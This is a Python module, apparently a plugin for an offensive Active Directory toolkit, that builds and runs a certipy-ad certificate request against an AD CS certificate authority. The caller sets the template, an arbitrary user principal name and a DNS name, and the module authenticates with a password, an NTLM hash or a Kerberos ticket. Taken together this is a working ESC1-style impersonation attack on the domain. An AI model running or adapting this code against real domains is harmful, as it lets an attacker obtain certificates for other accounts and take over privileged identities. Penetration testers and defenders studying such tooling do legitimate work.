import subprocess
import os
from pathlib import Path


def run(data, cred, args):
    extra = getattr(args, "extra", []) or []

    if not extra:
        print("[-] Missing template name")
        return None

    template = extra[0]

    request_upn = None
    ca = None
    dns = None
    out_dir = None

    i = 0
    while i < len(extra):
        if extra[i] == "--user" and i + 1 < len(extra):
            request_upn = extra[i + 1]
            i += 1
        elif extra[i] == "--ca" and i + 1 < len(extra):
            ca = extra[i + 1]
            i += 1
        elif extra[i] == "--dns" and i + 1 < len(extra):
            dns = extra[i + 1]
            i += 1
        elif extra[i] == "--out" and i + 1 < len(extra):
            out_dir = Path(extra[i + 1]).expanduser().resolve()
            i += 1
        i += 1

    domain = data.get("domain")
    ip = data.get("ip")

    if not ca:
        ca = data.get("adcs", {}).get("ca")

    # ✅ TRUST THE PASSED CRED
    auth_user = cred.get("user")
    typ = cred.get("type")
    secret = cred.get("secret")

    if not template or not auth_user or not domain or not ip or not ca:
        print("[-] Missing required values")
        return None

    # default UPN
    if not request_upn:
        request_upn = auth_user

    if "@" not in request_upn:
        request_upn = f"{request_upn}@{domain}"

    cmd = [
        "certipy-ad", "req",
        "-username", f"{auth_user}@{domain}",
        "-ca", ca,
        "-dc-ip", ip,
        "-template", template,
        "-upn", request_upn
    ]

    if typ == "password":
        cmd += ["-password", secret]

    elif typ == "ntlm":
        ntlm = secret if ":" in secret else f":{secret}"
        cmd += ["-hashes", ntlm]

    elif typ == "ticket":
        os.environ["KRB5CCNAME"] = secret
        cmd += ["-k", "-no-pass"]

    else:
        print("[-] Unsupported credential type")
        return None

    if dns:
        cmd += ["-dns", dns]

    cmd += ["-debug"]

    cmd = [str(x) for x in cmd]

    print(f"[*] Running: {' '.join(cmd)}")

    result = subprocess.run(cmd, cwd=out_dir)

    return {"success": result.returncode == 0}